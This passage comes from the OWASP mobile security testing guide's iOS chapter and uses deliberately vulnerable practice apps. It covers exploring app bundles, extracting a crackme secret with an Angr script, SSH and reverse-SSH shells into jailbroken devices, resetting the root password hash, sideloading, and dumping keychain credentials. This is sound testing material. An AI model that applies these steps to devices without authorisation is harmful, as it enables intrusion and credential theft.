/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app CachesDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches DocumentDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents LibraryDirectory /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library Asyoucansee,appshavetwomainlocations: • TheBundledirectory(/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/). • TheDatadirectory(/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/). Thesefolderscontaininformationthatmustbeexaminedcloselyduringapplicationsecurityassessments(forexample whenanalyzingthestoreddataforsensitivedata). Bundledirectory: • AppName.app – ThisistheApplicationBundleasseenbeforeintheIPA,itcontainsessentialapplicationdata,staticcontent aswellastheapplication’scompiledbinary. – Thisdirectoryisvisibletousers,butuserscan’twritetoit. – Contentinthisdirectoryisnotbackedup. – Thecontentsofthisfolderareusedtovalidatethecodesignature. Datadirectory: • Documents/ – Containsalltheuser-generateddata. Theapplicationenduserinitiatesthecreationofthisdata. – Visibletousersanduserscanwritetoit. – Contentinthisdirectoryisbackedup. – TheappcandisablepathsbysettingNSURLIsExcludedFromBackupKey. • Library/ – Containsallfilesthataren’tuser-specific,suchascaches,preferences,cookies,andpropertylist(plist)con- figurationfiles. – iOS apps usually use the Application Support and Caches subdirectories, but the app can create custom subdirectories. • Library/Caches/ – Containssemi-persistentcachedfiles. – Invisibletousersanduserscan’twritetoit. – Contentinthisdirectoryisnotbackedup. – TheOSmaydeletethisdirectory’sfilesautomaticallywhentheappisnotrunningandstoragespaceisrunning low. • Library/ApplicationSupport/ – Containspersistentfilesnecessaryforrunningtheapp. – Invisibletousersanduserscan’twritetoit. – Contentinthisdirectoryisbackedup. 358\n– TheappcandisablepathsbysettingNSURLIsExcludedFromBackupKey. • Library/Preferences/ – Usedforstoringpropertiesthatcanpersistevenafteranapplicationisrestarted. – Informationissaved,unencrypted,insidetheapplicationsandboxinaplistfilecalled[BUNDLE_ID].plist. – Allthekey/valuepairsstoredusingNSUserDefaultscanbefoundinthisfile. • tmp/ – Usethisdirectorytowritetemporaryfilesthatdonotneedtopersistbetweenapplaunches. – Containsnon-persistentcachedfiles. – Invisibletousers. – Contentinthisdirectoryisnotbackedup. – TheOSmaydeletethisdirectory’sfilesautomaticallywhentheappisnotrunningandstoragespaceisrunning low. Let’stakeacloserlookatiGoat-Swift’sApplicationBundle(.app)directoryinsidetheBundledirectory(/var/containers/ Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app): OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #ls NSFileType Perms NSFileProtection ... Name ------------ ------- ------------------ ... -------------------------------------- Regular 420 None ... rutger.html Regular 420 None ... mansi.html Regular 420 None ... splash.html Regular 420 None ... about.html Regular 420 None ... LICENSE.txt Regular 420 None ... Sentinel.txt Regular 420 None ... README.txt Directory 493 None ... URLSchemeAttackExerciseVC.nib Directory 493 None ... CutAndPasteExerciseVC.nib Directory 493 None ... RandomKeyGenerationExerciseVC.nib Directory 493 None ... KeychainExerciseVC.nib Directory 493 None ... CoreData.momd Regular 420 None ... archived-expanded-entitlements.xcent Directory 493 None ... SVProgressHUD.bundle Directory 493 None ... Base.lproj Regular 420 None ... Assets.car Regular 420 None ... PkgInfo Directory 493 None ... _CodeSignature Regular 420 None ... AppIcon60x60@3x.png Directory 493 None ... Frameworks Regular 420 None ... embedded.mobileprovision Regular 420 None ... Credentials.plist Regular 420 None ... Assets.plist Regular 420 None ... Info.plist Regular 493 None ... iGoat-Swift YoucanalsovisualizetheBundledirectoryfromGrapefruitbyclickingonFinder->Bundle: 359\nIncludingtheInfo.plistfile: AswellastheDatadirectoryinFinder->Home: 360\nRefertotheTestingDataStoragechapterformoreinformationandbestpracticesonsecurelystoringsensitivedata. Symbolic Execution Platform: ios TODO:Currentlydon’thavethis,butwedohavethissectionbelowwhichdoestalkaboutAngrandasmallintroreferring toAndroid Anintroductiontobinaryanalysisusingbinaryanalysisframeworkshasalreadybeendiscussedinthe“DynamicAnalysis” sectionforAndroid. Werecommendyoutorevisitthissectionandrefreshtheconceptsonthissubject. ForAndroid,weusedAngr’ssymbolicexecutionenginetosolveachallenge. Inthissection,wewillfirstlyuseUnicornto solvetheUnCrackableAppforiOSLevel1challengeandthenwewillrevisittheAngrbinaryanalysisframeworktoanalyze thechallengebutinsteadofsymbolicexecutionwewilluseitsconcreteexecution(ordynamicexecution)features. Angr Angrisaveryversatiletool,providingmultipletechniquestofacilitatebinaryanalysis,whilesupportingvariousfileformats andhardwareinstructionssets. TheMach-ObackendinAngrisnotwell-supported,butitworksperfectlyfineforourcase. While manually analyzing the code in the Reviewing Disassembled Native Code” section, we reached a point where performing further manual analysis was cumbersome. The function at offset 0x1000080d4 was identified as the final targetwhichcontainsthesecretstring. Ifwerevisitthatfunction,wecanseethatitinvolvesmultiplesub-functioncallsandinterestinglynoneofthesefunctions have any dependencies on other library calls or system calls. This is a perfect case to use Angr’s concrete execution engine. Followthestepsbelowtosolvethischallenge: 361\n• Get the ARM64 version of the binary by running lipo -thin arm64 <app_binary> -output uncrackable.arm64 (ARMv7canbeusedaswell). • CreateanAngrProjectbyloadingtheabovebinary. • Getacallableobjectbypassingtheaddressofthefunctiontobeexecuted. FromtheAngrdocumentation: “A Callableisarepresentationofafunctioninthebinarythatcanbeinteractedwithlikeanativepythonfunction.”. • Pass the above callable object to the concrete execution engine, which in this case is claripy.backends. concrete. • Accessthememoryandextractthestringfromthepointerreturnedbytheabovefunction. importangr importclaripy defsolve(): #Loadthebinarybycreatingangrproject. project =angr.Project('uncrackable.arm64') #Passtheaddressofthefunctiontothecallable func =project.factory.callable(0x1000080d4) #Getthereturnvalueofthefunction ptr_secret_string =claripy.backends.concrete.convert(func()).value print("Addressofthepointertothesecretstring:" +hex(ptr_secret_string)) #Extractthevaluefromthepointertothesecretstring secret_string =func.result_state.mem[ptr_secret_string].string.concrete print(f"SecretString: {secret_string}") solve() Above, Angr executed an ARM64 code in an execution environment provided by one of its concrete execution engines. Theresultisaccessedfromthememoryasiftheprogramisexecutedonarealdevice. Thiscaseisagoodexamplewhere binaryanalysisframeworksenableustoperformacomprehensiveanalysisofabinary,evenintheabsenceofspecialized devicesneededtorunit. Exploring the App Package Platform: ios Onceyouhavecollectedthepackagenameoftheapplicationyouwanttotarget,you’llwanttostartgatheringinformation aboutit. First,retrievetheIPAasexplainedinBasicTestingOperations-ObtainingandExtractingApps. YoucanunziptheIPAusingthestandardunziporanyotherZIPutility. Insideyou’llfindaPayloadfoldercontainingthe so-called Application Bundle (.app). The following is an example in the following output, note that it was truncated for betterreadabilityandoverview: $ls -1Payload/iGoat-Swift.app rutger.html mansi.html splash.html about.html LICENSE.txt Sentinel.txt README.txt URLSchemeAttackExerciseVC.nib CutAndPasteExerciseVC.nib RandomKeyGenerationExerciseVC.nib KeychainExerciseVC.nib CoreData.momd archived-expanded-entitlements.xcent SVProgressHUD.bundle Base.lproj Assets.car PkgInfo _CodeSignature AppIcon60x60@3x.png Frameworks embedded.mobileprovision Credentials.plist 362\nAssets.plist Info.plist iGoat-Swift Themostrelevantitemsare: • Info.plist contains configuration information for the application, such as its bundle ID, version number, and displayname. • _CodeSignature/containsaplistfilewithasignatureoverallfilesinthebundle. • Frameworks/containstheappnativelibrariesas.dylibor.frameworkfiles. • PlugIns/maycontainappextensionsas.appexfiles(notpresentintheexample). • iGoat-Swiftistheappbinarycontainingtheapp’scode. Itsnameisthesameasthebundle’snameminusthe.app extension. • Various resources such as images/icons, *.nib files (storing the user interfaces of iOS app), localized content (<language>.lproj),textfiles,audiofiles,etc. The Info.plist File The information property list or Info.plist (named by convention) is the main source of information for an iOS app. It consists of a structured file containing key-value pairs describing essential configuration information about the app. Actually,allbundledexecutables(appextensions,frameworksandapps)areexpectedtohaveanInfo.plistfile. You canfindallpossiblekeysintheAppleDeveloperDocumentation. ThefilemightbeformattedinXMLorbinary(bplist). YoucanconvertittoXMLformatwithonesimplecommand: • OnmacOSwithplutil,whichisatoolthatcomesnativelywithmacOS10.2andaboveversions(noofficialonline documentationiscurrentlyavailable): plutil -convert xml1Info.plist • OnLinux: aptinstall libplist-utils plistutil -iInfo.plist -oInfo_xml.plist Here’sanon-exhaustivelistofsomeinfoandthecorrespondingkeywordsthatyoucaneasilysearchforintheInfo.plist filebyjustinspectingthefileorbyusinggrep -i <keyword> Info.plist: • ApppermissionsPurposeStrings: UsageDescription(see“iOSPlatformAPIs”) • CustomURLschemes: CFBundleURLTypes(see“iOSPlatformAPIs”) • Exported/importedcustomdocumenttypes: UTExportedTypeDeclarations/UTImportedTypeDeclarations(see “iOSPlatformAPIs”) • AppTransportSecurity(ATS)configuration: NSAppTransportSecurity(see“iOSNetworkCommunication”) Pleaserefertothementionedchapterstolearnmoreabouthowtotesteachofthesepoints. App Binary iOSappbinariesarefatbinaries(theycanbedeployedonalldevices32-and64-bit). IncontrasttoAndroid,whereyou canactuallydecompiletheappbinarytoJavacode,theiOSappbinariescanonlybedisassembled. RefertothechapterTamperingandReverseEngineeringoniOSformoredetails. Native Libraries iOSappscanmaketheircodebasemodularbyusingdifferentelements. IntheMASTGwewillrefertoallofthemasnative libraries,buttheycancomeindifferentforms: • StaticandDynamicLibraries: 363\n– StaticLibrariescanbeusedandwillbecompiledintheappbinary. – Dynamic Libraries (typically having the .dylib extension) are also used but must be part of a framework bundle. Standalone Dynamic Libraries are not supported on iOS, watchOS, or tvOS, except for the system SwiftlibrariesprovidedbyXcode. • Frameworks(sinceiOS8). AFrameworkisahierarchicaldirectorythatencapsulatesadynamiclibrary,headerfiles, andresources,suchasstoryboards,imagefiles,andlocalizedstrings,intoasinglepackage. • BinaryFrameworks(XCFrameworks): Xcode11supportsdistributingbinarylibrariesusingtheXCFrameworksformat whichisanewwaytobundleupmultiplevariantsofaFramework,e.g.foranyoftheplatformsthatXcodesupports (includingsimulatoranddevices). Theycanalsobundleupstaticlibraries(andtheircorrespondingheaders)and supportbinarydistributionofSwiftandC-basedcode. XCFrameworkscanbedistributedasSwiftPackages. • SwiftPackages: Xcode11addsupportsforSwiftpackages, whicharereusablecomponentsofSwift, Objective-C, Objective-C++,C,orC++codethatdeveloperscanuseintheirprojectsandaredistributedassourcecode. Since Xcode12theycanalsobundleresources,suchasimages,storyboards,andotherfiles. SincePackagelibrariesare staticbydefault. Xcodecompilesthem,andthepackagestheydependon,andthenlinksandcombineseverything intotheapplication. YoucanviewnativelibrariesinGrapefruitbyclickingontheModulesiconintheleftmenubar: 364\nAndgetamoredetailedviewincludingtheirimports/exports: TheyareavailableintheFrameworksfolderintheIPA,youcanalsoinspectthemfromtheterminal: $ls -1Frameworks/ Realm.framework libswiftCore.dylib libswiftCoreData.dylib libswiftCoreFoundation.dylib orfromthedevicewithobjection(aswellasperSSHofcourse): OWASP.iGoat-Swifton (iPhone:11.1.2)[usb] #ls NSFileType Perms NSFileProtection ... Name ------------ ------- ------------------ ... ---------------------------- Directory 493 None ... Realm.framework Regular 420 None ... libswiftCore.dylib Regular 420 None ... libswiftCoreData.dylib Regular 420 None ... libswiftCoreFoundation.dylib ... Pleasenotethatthismightnotbethecompletelistofnativecodeelementsbeingusedbytheappassomecanbepartof thesourcecode,meaningthatthey’llbecompiledintheappbinaryandthereforecannotbefoundasstandalonelibraries orFrameworksintheFrameworksfolder. FornowthisisallinformationyoucangetabouttheFrameworksunlessyoustartreverseengineeringthem. Refertothe chapterTamperingandReverseEngineeringoniOSformoreinformationabouthowtoreverseengineerFrameworks. Other App Resources ItisnormallyworthtakingalookattherestoftheresourcesandfilesthatyoumayfindintheApplicationBundle(.app) insidetheIPAassometimestheycontainadditionalgoodieslikeencrypteddatabases,certificates,etc. 365\nAccessing the Device Shell Platform: ios Oneofthemostcommonthingsyoudowhentestinganappisaccessingthedeviceshell. Inthissectionwe’llseehowto accesstheiOSshellbothremotelyfromyourhostcomputerwith/withoutaUSBcableandlocallyfromthedeviceitself. Remote Shell IncontrasttoAndroidwhereyoucaneasilyaccessthedeviceshellusingtheadbtool,oniOSyouonlyhavetheoption to access the remote shell via SSH. This also means that your iOS device must be jailbroken in order to connect to its shellfromyourhostcomputer. Forthissectionweassumethatyou’veproperlyjailbrokenyourdeviceandhaveeither Cydia(seescreenshotbelow)orSileoinstalled. IntherestoftheguidewewillreferencetoCydia,butthesamepackages shouldbeavailableinSileo. 366\nInordertoenableSSHaccesstoyouriOSdeviceyoucaninstalltheOpenSSHpackage. Onceinstalled,besuretoconnect bothdevicestothesameWi-FinetworkandtakeanoteofthedeviceIPaddress,whichyoucanfindintheSettings-> Wi-Fimenuandtappingonceontheinfoiconofthenetworkyou’reconnectedto. Youcannowaccesstheremotedevice’sshellbyrunningssh root@<device_ip_address>,whichwilllogyouinasthe rootuser: $sshroot@192.168.197.234 root@192.168.197.234'spassword: iPhone:~root# PressControl+Dortypeexittoquit. WhenaccessingyouriOSdeviceviaSSHconsiderthefollowing: • Thedefaultusersarerootandmobile. • Thedefaultpasswordforbothisalpine. Remembertochangethedefaultpasswordforbothusersrootandmobileasanyoneonthesamenetworkcanfind theIPaddressofyourdeviceandconnectviathewell-knowndefaultpassword,whichwillgivethemrootaccessto yourdevice. Ifyouforgetyourpasswordandwanttoresetittothedefaultalpine: 1. Edit the file /private/etc/master.password on your jailbroken iOS device (using an on-device shell as shown below) 367\n2. Findthelines: root:xxxxxxxxx:0:0::0:0:SystemAdministrator:/var/root:/bin/sh mobile:xxxxxxxxx:501:501::0:0:MobileUser:/var/mobile:/bin/sh 3. Changexxxxxxxxxto/smx7MYTQIi2M(whichisthehashedpasswordalpine) 4. Saveandexit Connect to a Device via SSH over USB Duringarealblackboxtest,areliableWi-Ficonnectionmaynotbeavailable. Inthissituation,youcanuseusbmuxdto connecttoyourdevice’sSSHserverviaUSB. ConnectmacOStoaniOSdevicebyinstallingandstartingiproxy: $brewinstalllibimobiledevice $iproxy222222 waitingforconnection Theabovecommandmapsport22ontheiOSdevicetoport2222onlocalhost. Youcanalsomakeiproxyrunautomatically inthebackgroundifyoudon’twanttorunthebinaryeverytimeyouwanttoSSHoverUSB. Withthefollowingcommandinanewterminalwindow,youcanconnecttothedevice: $ssh -p2222root@localhost root@localhost'spassword: iPhone:~root# SmallnoteonUSBofaniDevice: onaniOSdeviceyoucannotmakedataconnectionsanymoreafter1hourofbeing inalockedstate,unlessyouunlockitagainduetotheUSBRestrictedMode,whichwasintroducedwithiOS11.4.1 On-device Shell App Whileusuallyusinganon-deviceshell(terminalemulator)mightbeverytediouscomparedtoaremoteshell,itcanprove handyfordebuggingincaseof,forexample,networkissuesorchecksomeconfiguration. Forexample,youcaninstall NewTerm2viaCydiaforthispurpose(itsupportsiOS6.0to12.1.2atthetimeofthiswriting). Inaddition,thereareafewjailbreaksthatexplicitlydisableincomingSSHforsecurityreasons. Inthosecases,itisvery convenienttohaveanon-deviceshellapp,whichyoucanusetofirstSSHoutofthedevicewithareverseshell,andthen connectfromyourhostcomputertoit. OpeningareverseshelloverSSHcanbedonebyrunningthecommandssh -R <remote_port>:localhost:22 <user- name>@<host_computer_ip>. Ontheon-deviceshellapprunthefollowingcommandand,whenasked,enterthepasswordofthemstguserofthehost computer: ssh-R2222:localhost:22mstg@192.168.197.235 On your host computer run the following command and, when asked, enter the password of the root user of the iOS device: ssh-p2222root@localhost Extracting Information from the Application Binary 368\nPlatform: ios You can use radare to get information about the binary, such as the architecture, the list of shared libraries, the list of classesandmethods,stringsandmore. Let’susetheDamnVulnerableiOSAppDVIAv1asanexample. Openitsmainbinarywithradare2: r2DamnVulnerableIOSApp Binary Information Togetinformationaboutthebinary, youcanusetheicommand. Thiscommandwilllistinformationaboutthebinary, suchasthearchitecture,thelistofsharedlibraries,thelistofclassesandmethods,stringsandmore. [0x1000180c8]>i ... size 0x43d5f0 humansz 4.2M mode r-x format mach064 iorw false block 0x100 packet xtr.fatmach0 ... lang objcwithblocks linenum false lsyms false nx false os ios pic true relocs true sanitizefalse static false strippedtrue Classes and Methods Andthenwecanproceedtoextractinformationaboutthemethodsintheapplication’ssourcecode. Todothis,weneed toloadtheapplicationbinaryintoradareandthenlisttheclassesandmethodsinthebinary. [0x1000180c8]>icc ... @interfaceSFAntiPiracy:NSObject { } +(int)isPirated +(int)isJailbroken +(void)killApplication +(bool)isTheDeviceJailbroken +(bool)isTheApplicationCracked +(bool)isTheApplicationTamperedWith +(int)urlCheck ... @end Notetheplussign,whichmeansthatthisisaclassmethodthatreturnsaBOOLtype. Aminussignwouldmeanthatthis isaninstancemethod. Refertolatersectionstounderstandthepracticaldifferencebetweenthese. Linked Libraries Thefollowingcommandislistingsharedlibraries: 369\n[0x1000180c8]>il [Linkedlibraries] /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration /System/Library/Frameworks/StoreKit.framework/StoreKit /System/Library/Frameworks/Security.framework/Security /System/Library/Frameworks/QuartzCore.framework/QuartzCore /System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices /usr/lib/libz.1.dylib /System/Library/Frameworks/CoreLocation.framework/CoreLocation /System/Library/Frameworks/CoreGraphics.framework/CoreGraphics /System/Library/Frameworks/CFNetwork.framework/CFNetwork /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox /System/Library/Frameworks/CoreData.framework/CoreData /System/Library/Frameworks/UIKit.framework/UIKit /System/Library/Frameworks/Foundation.framework/Foundation /usr/lib/libobjc.A.dylib /usr/lib/libSystem.B.dylib /System/Library/Frameworks/CoreFoundation.framework/CoreFoundation 16libraries Strings Obtainingstringsisveryusefulwhenreverseengineeringanappbecauseitcangiveyoualotofinformationaboutthe app’sfunctionality. Forexample,youcanfindURLs,APIendpoints,encryptionkeys,andmore. Youcanalsofindstrings that will point you to interesting functions, such as the login function or a function that checks whether the device is jailbroken. [0x1000180c8]>izz~cstring |less 299030x001d0b4c0x1001d0b4c5 6 5.__TEXT.__cstring ascii Admin 299040x001d0b520x1001d0b5213 14 5.__TEXT.__cstring ascii This!sA5Ecret 299050x001d0b600x1001d0b6015 16 5.__TEXT.__cstring ascii pushSuccessPage 299060x001d0b700x1001d0b704 5 5.__TEXT.__cstring ascii Oops 299070x001d0b750x1001d0b7530 31 5.__TEXT.__cstring ascii IncorrectUsernameorPassword 299080x001d0b940x1001d0b9417 18 5.__TEXT.__cstring ascii usernameTextField 299090x001d0ba60x1001d0ba639 40 5.__TEXT.__cstring ascii T@"UITextField",&,N,V_usernameTextField 299100x001d0bce0x1001d0bce17 18 5.__TEXT.__cstring ascii passwordTextField ... 299150x001d0ca80x1001d0ca818 19 5.__TEXT.__cstring ascii http://google.com/ 299260x001d0d730x1001d0d7337 38 5.__TEXT.__cstring ascii RequestSentusingpinning,lookout! 299270x001d0d990x1001d0d9977 78 5.__TEXT.__cstring ascii Certificatevalidationfailed. Youwillhavetodobetterthanthis,myboy!! Patching React Native Apps Platform: ios IftheReactNativeframeworkhasbeenusedfordevelopment,themainapplicationcodeisinthefilePayload/[APP]. app/main.jsbundle. ThisfilecontainstheJavaScriptcode. Mostofthetime,theJavaScriptcodeinthisfileisminified. WiththetoolJStillery,ahuman-readableversionofthefilecanberetried,whichwillallowcodeanalysis. TheCLIversion ofJStilleryandthelocalserverarepreferabletotheonlineversionbecausethelatterdisclosesthesourcecodetoathird party. Atinstallationtime,theapplicationarchiveisunpackedintothefolder/private/var/containers/Bundle/Application/ [GUID]/[APP].appfromiOS10onward,sothemainJavaScriptapplicationfilecanbemodifiedatthislocation. Toidentifytheexactlocationoftheapplicationfolder,youcanusethetoolipainstaller: 1. Use the command ipainstaller -l to list the applications installed on the device. Get the name of the target applicationfromtheoutputlist. 2. Usethecommandipainstaller -i [APP_NAME]todisplayinformationaboutthetargetapplication,includingthe installationanddatafolderlocations. 3. TakethepathreferencedatthelinethatstartswithApplication:. UsethefollowingapproachtopatchtheJavaScriptfile: 1. Navigatetotheapplicationfolder. 2. CopythecontentsofthefilePayload/[APP].app/main.jsbundletoatemporaryfile. 370\n3. UseJStillerytobeautifyandde-obfuscatethecontentsofthetemporaryfile. 4. Identifythecodeinthetemporaryfilethatshouldbepatchedandpatchit. 5. PutthepatchedcodeonasinglelineandcopyitintotheoriginalPayload/[APP].app/main.jsbundlefile. 6. Closeandrestarttheapplication. Patching Platform: ios Timetogetserious! Asyoualreadyknow,IPAfilesareactuallyZIParchives,soyoucanuseanyZIPtooltounpackthe archive. unzip UnCrackable-Level1.ipa Retrieving Cross References Platform: ios Ghidra can be used for analyzing the iOS binaries and obtaining cross references by right clicking the desired function andselectingShowReferencesto. Installing Apps Platform: ios When you install an application without using Apple’s App Store, this is called sideloading. There are various ways of sideloadingwhicharedescribedbelow. OntheiOSdevice,theactualinstallationprocessisthenhandledbytheinstalld daemon, which will unpack and install the application. To integrate app services or be installed on an iOS device, all applicationsmustbesignedwithacertificateissuedbyApple. Thismeansthattheapplicationcanbeinstalledonlyafter successful code signature verification. On a jailbroken phone, however, you can circumvent this security feature with AppSync,apackageavailableintheCydiastore. Itcontainsnumeroususefulapplicationsthatleveragejailbreak-provided root privileges to execute advanced functionality. AppSync is a tweak that patches installd, allowing the installation of fake-signedIPApackages. DifferentmethodsexistforinstallinganIPApackageontoaniOSdevice,whicharedescribedindetailbelow. PleasenotethatiTunesisnolongeravailableinmacOSCatalina. IfyouareusinganolderversionofmacOS,iTunes isstillavailablebutsinceiTunes12.7itisnotpossibletoinstallapps. Cydia Impactor CydiaImpactorwasoriginallycreatedtojailbreakiPhones,buthasbeenrewrittentosignandinstallIPApackagestoiOS devices via sideloading (and even APK files to Android devices). Cydia Impactor is available for Windows, macOS and Linux. Astepbystepguideandtroubleshootingstepsareavailableonyalujailbreak.net. libimobiledevice OnLinuxandalsomacOS,youcanalternativelyuselibimobiledevice,across-platformsoftwareprotocollibraryandaset oftoolsfornativecommunicationwithiOSdevices. ThisallowsyoutoinstallappsoveraUSBconnectionbyexecuting ideviceinstaller. TheconnectionisimplementedwiththeUSBmultiplexingdaemonusbmuxd,whichprovidesaTCPtunnel overUSB. ThepackageforlibimobiledevicewillbeavailableinyourLinuxpackagemanager. OnmacOSyoucaninstalllibimobilede- viceviabrew: 371\nbrewinstalllibimobiledevice brewinstallideviceinstaller After the installation you have several new command line tools available, such as ideviceinfo, ideviceinstaller or idevicedebug. ##ThefollowingcommandwillshowdetailedinformationabouttheiOSdeviceconnectedviaUSB. $ideviceinfo ##ThefollowingcommandwillinstalltheIPAtoyouriOSdevice. $ideviceinstaller -iiGoat-Swift_v1.0-frida-codesigned.ipa ... Install:Complete ##Thefollowingcommandwillstarttheappindebugmode,byprovidingthebundlename.Thebundlenamecanbefoundinthepreviouscommandafter"Installing". $idevicedebug -drunOWASP.iGoat-Swift ipainstaller TheIPAcanalsobedirectlyinstalledontheiOSdeviceviathecommandlinewithipainstaller. Aftercopyingthefileover tothedevice,forexampleviascp,youcanexecuteipainstallerwiththeIPA’sfilename: ipainstallerApp_name.ipa ios-deploy OnmacOSyoucanalsousetheios-deploytooltoinstalliOSappsfromthecommandline. You’llneedtounzipyourIPA sinceios-deployusestheappbundlestoinstallapps. unzip Name.ipa ios-deploy --bundle 'Payload/Name.app' -W-d-v AftertheappisinstalledontheiOSdevice,youcansimplystartitbyaddingthe-mflagwhichwilldirectlystartdebugging withoutinstallingtheappagain. ios-deploy --bundle 'Payload/Name.app' -W-d-v-m Xcode ItisalsopossibletousetheXcodeIDEtoinstalliOSappsbydoingthefollowingsteps: 1. StartXcode 2. SelectWindow/DevicesandSimulators 3. SelecttheconnectediOSdeviceandclickonthe+signinInstalledApps. Allow Application Installation on a Non-iPad Device SometimesanapplicationcanrequiretobeusedonaniPaddevice. IfyouonlyhaveiPhoneoriPodtouchdevicesthen youcanforcetheapplicationtoaccepttobeinstalledandusedonthesekindsofdevices. Youcandothisbychanging thevalueofthepropertyUIDeviceFamilytothevalue1intheInfo.plistfile. <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC"-//Apple//DTDPLIST1.0//EN""http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> <key>UIDeviceFamily</key> <array> <integer>1</integer> </array> </dict> </plist> 372\nItisimportanttonotethatchangingthisvaluewillbreaktheoriginalsignatureoftheIPAfilesoyouneedtore-signthe IPA,aftertheupdate,inordertoinstallitonadeviceonwhichthesignaturevalidationhasnotbeendisabled. ThisbypassmightnotworkiftheapplicationrequirescapabilitiesthatarespecifictomoderniPadswhileyouriPhoneor iPodisabitolder. PossiblevaluesforthepropertyUIDeviceFamilycanbefoundintheAppleDeveloperdocumentation. Onefundamentalstepwhenanalyzingappsisinformationgathering. Thiscanbedonebyinspectingtheapppackage on your host computer or remotely by accessing the app data on the device. You’ll find more advance techniques in thesubsequentchaptersbut,fornow,wewillfocusonthebasics: gettingalistofallinstalledapps,exploringtheapp packageandaccessingtheappdatadirectoriesonthedeviceitself. Thisshouldgiveyouabitofcontextaboutwhatthe app is all about without even having to reverse engineer it or perform more advanced analysis. We will be answering questionssuchas: • Whichfilesareincludedinthepackage? • WhichFrameworksdoestheappuse? • Whichcapabilitiesdoestheapprequire? • Whichpermissionsdoestheapprequesttotheuserandforwhatreason? • Doestheappallowanyunsecuredconnections? • Doestheappcreateanynewfileswhenbeinginstalled? Get Open Connections Platform: ios lsofcommandwheninvokedwithoption-i,itgivesthelistofopennetworkportsforallactiveprocessesonthedevice. Togetalistofopennetworkportsforaspecificprocess,thelsof-i-a-p<pid>commandcanbeused,where-a(AND) optionisusedforfiltering. BelowafilteredoutputforPID1isshown. iPhone:~root#lsof -i-a-p1 COMMANDPIDUSER FD TYPE DEVICESIZE/OFFNODENAME launchd 1root 27u IPv60x69c2ce210efdc023 0t0 TCP *:ssh (LISTEN) launchd 1root 28u IPv60x69c2ce210efdc023 0t0 TCP *:ssh (LISTEN) launchd 1root 29u IPv40x69c2ce210eeaef53 0t0 TCP *:ssh (LISTEN) launchd 1root 30u IPv40x69c2ce210eeaef53 0t0 TCP *:ssh (LISTEN) launchd 1root 31u IPv40x69c2ce211253b90b 0t0 TCP192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED) launchd 1root 42u IPv40x69c2ce211253b90b 0t0 TCP192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED) Dumping KeyChain Data Platform: ios DumpingtheKeyChaindatacanbedonewithmultipletools,butnotallofthemwillworkonanyiOSversion. Asismore oftenthecase,trythedifferenttoolsorlookuptheirdocumentationforinformationonthelatestsupportedversions. Objection (Jailbroken / non-Jailbroken) The KeyChain data can easily be viewed using Objection. First, connect objection to the app as described in “Recom- mendedTools-Objection”. Then,usetheios keychain dumpcommandtogetanoverviewofthekeychain: $objection --gadget="iGoat-Swift" explore ...[usb]#ioskeychaindump ... Note:YoumaybeaskedtoauthenticateusingthedevicespasscodeorTouchID Savetheoutputbyadding `--jsonkeychain.json`tothiscommand DumpingtheiOSkeychain... Created Accessible ACL Type Account Service Data ------------------------- ------------------------------ ----- -------- ------------------- -------------------------- ↪ ---------------------------------------------------------------------- 2019-06-0610:53:09+0000 WhenUnlocked None Password keychainValue com.highaltitudehacks.dvia mypassword123 2019-06-0610:53:30+0000 WhenUnlockedThisDeviceOnly None Password SCAPILazyVector com.toyopagroup.picaboo (failedtodecode) 2019-06-0610:53:30+0000 AfterFirstUnlockThisDeviceOnly None Password fideliusDeviceGraph com.toyopagroup.picaboo (failedtodecode) 373\n2019-06-0610:53:30+0000 AfterFirstUnlockThisDeviceOnly None Password SCDeviceTokenKey2 com.toyopagroup.picaboo ↪ 00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh 2019-06-0610:53:30+0000 AfterFirstUnlockThisDeviceOnly None Password SCDeviceTokenValue2 com.toyopagroup.picaboo ↪ CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U= OWASP.iGoat-Swifton (iPhone:12.0)[usb] #quit Notethatcurrently,thelatestversionsoffrida-serverandobjectiondonotcorrectlydecodeallkeychaindata. Different combinationscanbetriedtoincreasecompatibility. Forexample,thepreviousprintoutwascreatedwithfrida-tools==1. 3.0,frida==12.4.8andobjection==1.5.0. Finally, sincethekeychaindumperisexecutedfromwithintheapplicationcontext, itwillonlyprintoutkeychainitems thatcanbeaccessedbytheapplicationandnottheentirekeychainoftheiOSdevice. Grapefruit (Jailbroken / non-Jailbroken) WithGrapefruitit’spossibletoaccessthekeychaindataoftheappyouhaveselected. InsidetheStoragesection,click onKeychainandyoucanseealistingofthestoredKeychaininformation. Keychain-dumper (Jailbroken) YoucanuseKeychain-dumperdumpthejailbrokendevice’sKeyChaincontents. Onceyouhaveitrunningonyourdevice: iPhone:~root#/tmp/keychain_dumper (...) GenericPassword ---------------- Service:myApp Account:key3 EntitlementGroup:RUD9L355Y.sg.vantagepoint.example Label: (null) GenericField: (null) KeychainData:SmJSWxEs GenericPassword ---------------- 374\nService:myApp Account:key7 EntitlementGroup:RUD9L355Y.sg.vantagepoint.example Label: (null) GenericField: (null) KeychainData:WOg1DfuH In newer versions of iOS (iOS 11 and up), additional steps are necessary. See the README.md for more details. Note thatthisbinaryissignedwithaself-signedcertificatethathasa“wildcard”entitlement. Theentitlementgrantsaccess toallitemsintheKeychain. Ifyouareparanoidorhaveverysensitiveprivatedataonyourtestdevice,youmaywantto buildthetoolfromsourceandmanuallysigntheappropriateentitlementsintoyourbuild;instructionsfordoingthisare 